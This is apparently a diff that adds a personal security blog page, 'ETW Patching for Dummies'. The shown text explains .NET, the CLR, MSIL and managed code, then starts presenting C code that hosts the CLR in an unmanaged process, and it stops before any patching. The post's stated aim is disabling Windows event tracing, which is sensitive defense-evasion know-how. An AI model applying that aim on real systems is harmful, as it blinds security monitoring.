@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+
+
+    
+
+<html lang="en-us" data-theme="dark">
+<head>
+    
+        
+<meta charset="utf-8">
+<meta name="HandheldFriendly" content="True">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer-when-downgrade">
+
+<title>ETW Patching for Dummies - bl0g</title>
+
+<meta name="description" content="ETW Patching For Dummies Introduction to all things ETW When initially getting into ETW and patching it, I was not prepared for what was coming. It was a deep rabbit hole of .NET, CLR and Windows Internals. Coming from a pure-C background(and a bit of Rust), this was a deep hole I was not prepared for at all. This blog is supposed to be more of a Journal than a tutorial as I try to figure things out!">
+
+
+
+
+
+<link rel="icon" type="image/x-icon" href="https://whokilleddb.github.io/blogs/favicon.ico">
+<link rel="apple-touch-icon-precomposed" href="https://whokilleddb.github.io/blogs/favicon.png">
+
+
+<style>
+  body {
+    visibility: hidden;
+    opacity: 0;
+  }
+</style>
+
+<noscript>
+  <style>
+    body {
+      visibility: visible;
+      opacity: 1;
+    }
+  </style>
+</noscript>
+
+
+
+    
+
+
+
+
+
+    
+    
+        
+    
+    
+
+    
+        <link rel="stylesheet" href="https://whokilleddb.github.io/blogs/css/style.min.8ae46a41295e148d0bcce914795c26e3e5d1bed4c4e883eb30e82d224c152218.css" integrity="sha256-iuRqQSleFI0LzOkUeVwm4&#43;XRvtTE6IPrMOgtIkwVIhg=">
+    
+
+
+
+
+
+    
+
+    
+
+
+
+
+
+    
+    
+        
+    
+    
+
+    
+        <script src="https://whokilleddb.github.io/blogs/js/script.min.74bf1a3fcf1af396efa4acf3e660e876b61a2153ab9cbe1893ac24ea6d4f94ee.js" type="text/javascript" charset="utf-8" integrity="sha256-dL8aP88a85bvpKzz5mDodrYaIVOrnL4Yk6wk6m1PlO4="></script>
+    
+
+
+
+
+
+
+
+<meta property="og:title" content="ETW Patching for Dummies" />
+<meta property="og:description" content="ETW Patching For Dummies Introduction to all things ETW When initially getting into ETW and patching it, I was not prepared for what was coming. It was a deep rabbit hole of .NET, CLR and Windows Internals. Coming from a pure-C background(and a bit of Rust), this was a deep hole I was not prepared for at all. This blog is supposed to be more of a Journal than a tutorial as I try to figure things out!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://whokilleddb.github.io/blogs/posts/etw-patching-for-dummies/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-25T02:09:33+05:30" />
+<meta property="article:modified_time" content="2023-01-25T02:09:33+05:30" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ETW Patching for Dummies"/>
+<meta name="twitter:description" content="ETW Patching For Dummies Introduction to all things ETW When initially getting into ETW and patching it, I was not prepared for what was coming. It was a deep rabbit hole of .NET, CLR and Windows Internals. Coming from a pure-C background(and a bit of Rust), this was a deep hole I was not prepared for at all. This blog is supposed to be more of a Journal than a tutorial as I try to figure things out!"/>
+
+
+
+
+
+
+
+
+
+
+
+    
+</head>
+<body>
+    <a class="skip-main" href="#main">Skip to main content</a>
+    <div class="container">
+        <header class="common-header"> 
+            
+                <div class="header-top">
+    <h1 class="site-title">
+    <a href="/blogs">bl0g</a>
+</h1>
+    <ul class="social-icons">
+
+
+    
+        
+        
+        <li>
+            <a href="https://github.com/whokilleddb" title="Github" rel="me">
+            <span class="inline-svg" >
+
+
+
+
+    
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+</span>
+
+            </a>
+        </li>
+    
+
+    
+        
+        
+        <li>
+            <a href="https://twitter.com/whokilleddb" title="Twitter" rel="me">
+            <span class="inline-svg" >
+
+
+
+
+    
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+
+</span>
+
+            </a>
+        </li>
+    
+
+    
+        
+        
+        <li>
+            <a href="https://www.linkedin.com/in/whokilleddb" title="Linkedin" rel="me">
+            <span class="inline-svg" >
+
+
+
+
+    
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+</span>
+
+            </a>
+        </li>
+    
+
+
+
+
+</ul>
+</div>
+
+    <nav></nav>
+
+
+
+
+            
+        </header>
+        <main id="main" tabindex="-1"> 
+            
+    
+
+    <article class="post h-entry">
+        <div class="post-header">
+            <header>
+                <h1 class="p-name post-title">ETW Patching for Dummies</h1>
+
+                
+            </header>
+        </div>
+        <div class="content e-content">
+            <h1 id="etw-patching-for-dummies" >ETW Patching For Dummies
+<span>
+    <a href="#etw-patching-for-dummies">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h1><h2 id="introduction-to-all-things-etw" >Introduction to all things ETW
+<span>
+    <a href="#introduction-to-all-things-etw">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p>When initially getting into ETW and patching it, I was not prepared for what was coming. It was a deep rabbit hole of <code>.NET</code>, <code>CLR</code> and <code>Windows Internals</code>. Coming from a pure-<code>C</code> background(and a bit of <code>Rust</code>), this was a deep hole I was not prepared for at all. This blog is supposed to be more of a Journal than a tutorial as I try to figure things out! So, if you are someone who is as lost as I am, with Zero knowledge of the <code>.NET Framework</code> or any of the <code>C#</code> stuff and want to go around patching stuff, welcome to the journey.</p>
+<p>*PS: There will be a scramble of topics in no particular order, mostly discussing topics relevant to the cause. The contents of this blog post, including all source code can be found <a href="https://github.com/whokilleddb/etw-patching-for-dummies">here</a> *</p>
+<h2 id="show-and-tell---the-net-framework" >Show and Tell - The .NET FRAMEWORK
+<span>
+    <a href="#show-and-tell---the-net-framework">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p>So, when I started writing this blog, I had no idea what <code>.NET</code> really was. All knew was that its <em>some-sorta</em> framework by Microsoft for doing windows stuff. Turns out, it is a framework for <code>C#</code> and a version of <code>C++</code> called <code>C++/CLI</code>, which can be compiled with <code>Visual C++</code> on Windows. Here, my first question was, <em>&ldquo;Hey, then how is it different from normal C++ code?&rdquo;</em></p>
+<p>And to solve that question, I decided to do what all good devs would have done: write a <em>&ldquo;Hello World&rdquo;</em> program in both styles.</p>
+<p><strong>Native C++</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">// helloworld.cpp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;thread&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;chrono&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Hello, World!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>this_thread<span style="color:#f92672">::</span>sleep_for(std<span style="color:#f92672">::</span>chrono<span style="color:#f92672">::</span>seconds(<span style="color:#ae81ff">100</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>C++/CLI</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">// helloworld_cli.cpp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#using &lt;mscorlib.dll&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> System;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> System<span style="color:#f92672">::</span>Threading;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>  Console<span style="color:#f92672">::</span>WriteLine(<span style="color:#e6db74">&#34;Hello, World!&#34;</span>);
+</span></span><span style="display:flex;"><span>  Thread<span style="color:#f92672">::</span>Sleep(<span style="color:#ae81ff">100000</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Both of these can be compiled with <code>cl.exe</code> aka the <code>Visual Studio Compiler</code> as such:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>&gt; cl.exe helloworld.cpp /EHsc
+</span></span><span style="display:flex;"><span>&gt; cl.exe helloworld_cli.cpp /clr
+</span></span></code></pre></div><p>This should give us two binaries: <code>helloworld.exe</code> and <code>helloworld_cli.exe</code>, both of which print the same <code>&quot;Hello, World!&quot;</code> statement and then go to sleep. The sleep part is there to give us enough time to examine the process.</p>
+<p>The first thing which I noticed was that the <code>C++/CLI</code> excutable was much smaller than the native <code>C++</code> executable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>10-01-2023  15:19           242,688 helloworld.exe
+</span></span><span style="display:flex;"><span>10-01-2023  04:49            32,256 helloworld_cli.exe
+</span></span></code></pre></div><p>This is becase when you compile a C++/CLI program, the resulting executable is actually a combination of native machine code and <code>managed code</code>.</p>
+<p><code>Managed code</code> is code that runs under the control of the <code>.NET</code> runtime, which provides a number of services such as memory management, exception handling, and type safety (we would talk more about this later). Because the runtime provides these services, managed code does not need to include the same kind of infrastructure that is required for native code.</p>
+<p>As a result, <code>C++/CLI</code> executables are typically smaller in size than native <code>C++</code> executables. This is because they don&rsquo;t need to include memory management, exception handling and other related implementations themselves, which are provided by the runtime.</p>
+<p>Additionally, C++/CLI codes makes use of the <code>CLR</code> (another thing we would get to later) which is a part of the <code>.NET</code> Framework, this framework ships with the operating system, as such <code>C++/CLI</code> application does not require any additional runtime or library dependencies.</p>
+<p>Looking at each process in <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explorer</a>, we see the following:</p>
+<p><img src="/blogs/images/etw-patching-for-dummies/helloworld_process_explorer.png" alt=""></p>
+<p><img src="/blogs/images/etw-patching-for-dummies/helloworld_cli_process_explorer.png" alt=""></p>
+<p>The first thing I noticed was that the <code>C++/CLI</code> executable has two extra tabs:</p>
+<ul>
+<li>
+<p><code>.NET Assemblies</code> - This feature allows you to view the <code>.NET</code> assemblies that are loaded in a specific process. The tab displays information such as the assembly name, version, and location, as well as the classes and methods that are present in each assembly. This information can be helpful for troubleshooting issues with <code>.NET</code> applications, as well as for understanding the internal workings of a process.</p>
+</li>
+<li>
+<p><code>.NET Performance</code> - This feature allows you to view performance statistics for the <code>.NET Framework</code> in a specific process. The tab displays information such as the number of <code>.NET</code> objects and exceptions, the number of GC collections, the amount of memory allocated, and the CPU time consumed by the <code>.NET</code> runtime. This tab also allows you to view performance counter metrics for the <code>CLR</code> such as the number of bytes in all heaps and the current number of Gen 0, 1 and 2 collections. This information can be helpful for diagnosing performance issues in <code>.NET</code> applications, such as high memory usage or poor garbage collection behavior.</p>
+</li>
+</ul>
+<p>Only the first one is of interest to us for now. The tab contains the following information:
+<img src="/blogs/images/etw-patching-for-dummies/dotnet_assemblies_tab.png" alt=""></p>
+<p>First things first, notice the <code>CLR</code> version. We will talk about <code>CLR</code> later either ways. Next up, notice the flag values adjacent to the <code>helloworld_cli.exe</code> name. The <code>CONCURRENT_GC</code> means that the garbage collector runs concurrently with the application, which can help to reduce the amount of time that the application is paused while the garbage collector is running. Next comes the <code>ManagedExe</code> flag which signifies that the executable runs using the <code>CLR</code>. Another interesting word which keeps popping is <code>AppDomain</code>.</p>
+<blockquote>
+<p>An AppDomain, short for Application Domain, is a lightweight and isolated execution environment within a process in the .NET Framework. It allows multiple applications to run within a single process while maintaining isolation and security between them.</p>
+</blockquote>
+<p>So, it&rsquo;s like a logical isolation. I like to think of it to be loosely akin to Linux <code>namespaces</code> but more dotnet-y. Moving on, we see another <code>AppDomain</code> by the name of <code>SharedDomain</code> in there with <code>mscorlib.dll</code>. I really like <a href="http://www.danielmoth.com/Blog/mscorlibdll.aspx">The Moth&rsquo;s Explanation</a> of the name: ms(Microsoft)-cor(Common Object Runtime)-lib(Library) [yeah yeah its ms stands for multilingual standard now, but the original name makes more sense].  According to <a href="https://social.msdn.microsoft.com/Forums/vstudio/en-US/92a0c975-e350-4d8d-af8e-36ec0ad6c95c/specific-purpose-of-mscorlib-dll-in-net?forum=clr">this thread</a> on microsoft&rsquo;s forums, this library contains the various namespace defintitions (so, much like kernel32/ntdll for normal programs?).</p>
+<p><img src="/blogs/images/etw-patching-for-dummies/mscorlib_dotpeek.png" alt=""></p>
+<p>I believe this is a good introduction to the land of <code>.NET</code>, but before we talk further, we need to discuss about <code>CLR</code> and <code>Managed Code</code>.</p>
+<h1 id="the-clr-common-language-runtime" >The CLR: Common Language Runtime
+<span>
+    <a href="#the-clr-common-language-runtime">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h1><p>The <code>CLR</code> is the Virtual Machine component of the <code>.NET Framework</code>. It is  responsible for executing <code>Managed</code> code. It provides a layer of abstraction between the application and the operating system, allowing the application to run in a more secure and stable environment. The <code>CLR</code> also provides a number of services to the application, such as memory management, thread execution, security, and code execution.</p>
+<p>One of the more important components which the <code>CLR</code> contains is a JIT compiler which is responsible for converting <code>MSIL</code> (Microsoft Intermediate Language) code, which is the intermediate language generated by the compiler when the source code of a <code>.NET</code> application is compiled, into native machine code that can be executed by the computer&rsquo;s hardware..</p>
+<h2 id="msil---a-short-note" >MSIL - A Short Note
+<span>
+    <a href="#msil---a-short-note">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p><code>MSIL</code> (Microsoft Intermediate Language) is a low-level programming language used in the <code>.NET Framework</code>. It is an intermediate language between the source code of a program and the machine code that is executed by the computer.</p>
+<p>When a <code>.NET</code> application is compiled, the source code written in languages such as <code>C#</code> or Visual Basic is transformed into <code>MSIL</code>. <code>MSIL</code> is a platform-independent language, meaning that the same <code>MSIL</code> code can be executed on different platforms and architectures, such as Windows, Linux, or macOS, as long as the <code>.NET Framework</code> is installed.</p>
+<p><code>MSIL</code> contains instructions that are executed by the <code>CLR</code> (Common Language Runtime) at runtime, rather than being executed directly by the computer&rsquo;s hardware. This allows the <code>CLR</code> to provide services such as memory management, security, and code execution, to the application.</p>
+<p><code>MSIL</code> also contains metadata, which is data about the types, members, and other elements in the code. The metadata is used by the <code>CLR</code> to determine the types and members that are used by the application, to resolve dependencies, and to enforce security policies.</p>
+<p>It&rsquo;s important to note that, <code>MSIL</code> code is not executed directly by the hardware, instead it is compiled to native code at runtime by the JIT (Just-In-Time) compiler, which is a component of the <code>CLR</code>. This allows the code to be optimized for the specific hardware and operating system that it is running on, which results in more efficient execution.</p>
+<h2 id="managed-code" >Managed Code
+<span>
+    <a href="#managed-code">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p>Managed code in the .NET Framework refers to code that is executed by the Common Language Runtime (<code>CLR</code>) rather than directly by the computer&rsquo;s hardware. <code>Managed code</code> is written in a managed programming language, such as <code>C#</code> or <code>Visual Basic</code>, and it is compiled into an intermediate language called Microsoft Intermediate Language (MSIL). MSIL is a low-level programming language that is executed by the CLR at runtime, rather than being executed directly by the computer&rsquo;s hardware.</p>
+<hr>
+<p>Okay that was a lot of theory. Long story short, <code>.NET</code> code requires the <code>CLR</code> to run the <code>MSIL</code>, hence it is <em>&ldquo;managed&rdquo;</em>. Now here comes the next big question: <strong>&ldquo;Can we call managed code from an unmanaged process?&rdquo;</strong>. Well, turns out we can, but for that we need to manually load <code>CLR</code> into the process. Taking a page out of <a href="https://blog.xpnsec.com/hiding-your-dotnet-etw/">Adam Chester&rsquo;s Blog</a> we can write some code to load a <code>CLR</code> instance into an unmanaged process and call managed code from there.
+The code can be found <a href="https://github.com/whokilleddb/load-my-clr">here</a>. Lets break it down.</p>
+<p>There are four primary wrapper functions:</p>
+<ul>
+<li><code>GetCLRInterface</code></li>
+<li><code>StartRuntime</code></li>
+<li><code>RunAssembly</code></li>
+<li><code>StopRuntime</code></li>
+</ul>
+<p>These functions load the <code>CLR</code> into our unmanaged process, start the runtime, run the <code>.NET</code> code and then finally stop the runtime.</p>
+<h3 id="getclrinterface" ><code>GetCLRInterface</code>
+<span>
+    <a href="#getclrinterface">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>First, we create a instance of the type <code>ICLRMetaHost</code> by calling the following the <code>CLRCreateInstance()</code> function as such:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>result <span style="color:#f92672">=</span> <span style="color:#a6e22e">CLRCreateInstance</span>(<span style="color:#f92672">&amp;</span>CLSID_CLRMetaHost, <span style="color:#f92672">&amp;</span>IID_ICLRMetaHost, (LPVOID<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>metahost);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (result <span style="color:#f92672">!=</span> S_OK){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[!] CLRCreateInstance() function failed (0x%x)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, result);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This provides us with a <code>ICLRMetaHost</code> Interface which we can use to perfeorm a multitude of tasks like return a specific version of the common language runtime (CLR) based on its version number, list all installed CLRs, list all runtimes that are loaded in a specified process, discover the CLR version used to compile an assembly, exit a process with a clean runtime shutdown, and query legacy API binding, etc. Refer the official <a href="https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrmetahost-interface#methods">docs</a> here!</p>
+<p>Once we have our interface, we can use it to enumerate all installed Runtimes wth:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>result <span style="color:#f92672">=</span> <span style="color:#a6e22e">ICLRMetaHost_EnumerateInstalledRuntimes</span>(metahost, <span style="color:#f92672">&amp;</span>runtime);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (result <span style="color:#f92672">!=</span> S_OK){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[!] EnumerateInstalledRuntimes() function failed (0x%x)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, result);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This returns an enumeration that contains a valid <a href="https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimeinfo-interface">ICLRRuntimeInfo</a> interface for each version of the common language runtime (CLR) that is installed on a computer. We can go throught these entries and list all the available versions with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">while</span>((result <span style="color:#f92672">=</span> <span style="color:#a6e22e">IEnumUnknown_Next</span>(runtime, <span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>unk, <span style="color:#ae81ff">0</span>)) <span style="color:#f92672">==</span> S_OK){
+</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> <span style="color:#a6e22e">IUnknown_QueryInterface</span>(unk, <span style="color:#f92672">&amp;</span>IID_ICLRRuntimeInfo, (<span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>runtimeinfo);
+</span></span><span style="display:flex;"><span>  count <span style="color:#f92672">=</span> MAX_PATH;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (result <span style="color:#f92672">==</span> S_OK){
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Get Version String
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    result <span style="color:#f92672">=</span> <span style="color:#a6e22e">ICLRRuntimeInfo_GetVersionString</span>(runtimeinfo, buf, <span style="color:#f92672">&amp;</span>count);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (result <span style="color:#f92672">==</span> S_OK <span style="color:#f92672">&amp;&amp;</span> count <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;[i] Found Runtime Version: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[!] ICLRRuntimeInfo_GetVersionString() Failed (0x%x)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, result);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">IUnknown_Release</span>(unk);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This should list all the available versions of the <code>CLR</code> to us. We just go for the last available version and if it can be loaded into the current system, we are good to go:</p>
